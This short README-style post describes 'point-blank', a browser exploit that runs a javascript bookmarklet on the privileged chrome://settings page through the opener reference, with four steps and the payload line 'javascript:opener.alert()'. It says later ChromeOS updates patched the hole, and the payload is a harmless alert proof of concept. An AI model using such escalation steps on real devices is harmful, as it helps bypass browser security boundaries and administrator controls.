Run bookmarklets on privileged pages with point-blank!
This was patched in later chromeOS updates as you can't run javascript bookmarklets at all now!

Instructions:
1. Go to chrome://settings/resetProfileSettings.
2. Click current settings.
3. Run this as a bookmarklet: javascript:opener.alert()
4. You are now running code on the chrome://settings tab with only a bookmarklet!
